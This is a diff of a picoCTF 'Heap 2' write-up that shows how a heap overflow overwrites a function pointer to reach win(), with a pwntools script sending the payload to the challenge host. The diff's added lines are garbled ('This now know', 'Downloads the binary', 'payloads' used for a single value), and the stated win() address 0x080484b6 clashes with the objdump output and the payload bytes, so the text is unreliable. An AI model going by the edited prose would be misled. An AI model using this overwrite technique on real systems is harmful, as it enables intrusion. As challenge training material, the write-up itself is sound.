@@ -1,14 +1,14 @@
 ---
 layout: post
 title:  "Heap 2"
-description: Utilizing a buffer overflow payload to override pointers
+description: Utilizing a buffer overflow payloads to override pointers
 date:   2024-10-22
 tags: ["Medium", "Buffer Overflow", "Binary Exploitation"]
 category: [CTF,picoCTF]
 ---
 
 ## Challenge Info
-Can you handle function pointers? Download the binary [here](https://artifacts.picoctf.net/c_mimas/49/chall). Download the source [here](https://artifacts.picoctf.net/c_mimas/49/chall.c).
+Can you handle function pointers? Downloads the binary [here](https://artifacts.picoctf.net/c_mimas/49/chall). Downloads the source [here](https://artifacts.picoctf.net/c_mimas/49/chall.c).
 
 Additional details will be available after launching your challenge instance.
 
@@ -161,13 +161,13 @@ Just like last time, we're given the addresses. The only thing that's different 
 
 ## The Plan
 
-We now know that `input_data` is 32 bytes behind `x`. Additionally, we know that the `check_win()` function executes a function at the address stored in the `x` pointer. Finally we know that if a `win()` function is declared, it'll read us the flag.
+This now know that `input_data` is 32 bytes behind `x`. Additionally, we know that the `check_win()` function executes a function at the address stored in the `x` pointer. Finally we know that if a `win()` function is declared, it'll read us the flag.
 
 *So, in short, we want to:* overflow to reach the `x` pointer, and then get it to hold a value identical to the address of the `win()` function, so that when `check_win()` is automatically ran, instead of executing *'bico'* at `x`, it will execute `win()`- thus giving us our flag.
 
 ## Solution
 
-Before we write our payload, we need to know the address corresponding to `win()`. A simple [objdump](https://man7.org/linux/man-pages/man1/objdump.1.html) will reveal this:
+Before we write our payloads, we need to know the address corresponding to `win()`. A simple [objdump](https://man7.org/linux/man-pages/man1/objdump.1.html) will reveal this:
 
 ```terminal
 > objdump -d ./chall | grep win
@@ -175,9 +175,9 @@ Before we write our payload, we need to know the address corresponding to `win()
 00000000004011f0 <check_win>:
 ```
 
-We now know that `win()` is at `0x080484b6`. **However**, because of C's memory layout, we need to consider C's memory layout. C uses a little-endian system to ensure that the least significant bytes are placed first. Because of this, we want to input the address of `win()` in little-endian order.
+This now know that `win()` is at `0x080484b6`. **However**, because of C's memory layout, we need to consider C's memory layout. C uses a little-endian system to ensure that the least significant bytes are placed first. Because of this, we want to input the address of `win()` in little-endian order.
 
-Our payload should look something like this:
+Our payloads should look something like this:
 
 ```py
 from pwn import *
@@ -185,8 +185,8 @@ from pwn import *
 # Connect to the remote service
 p = remote("mimas.picoctf.net", 53827)
 
-# Construct the payload
-payload = b"AAAA" * 8 + b"\xa0\x11\x40\x00\x00\x00\x00\x00"
+# Construct the payloads
+payloads = b"AAAA" * 8 + b"\xa0\x11\x40\x00\x00\x00\x00\x00"
 
 # Send option '2' to allocate the object
 p.sendline(b"2")
@@ -194,8 +194,8 @@ p.sendline(b"2")
 # Wait for the server to ask for the buffer input
 p.recvuntil(b"buffer:")
 
-# Send the constructed payload
-p.sendline(payload)
+# Send the constructed payloads
+p.sendline(payloads)
 
 # Wait for the next prompt (choice menu)
 p.recvuntil(b"choice:")
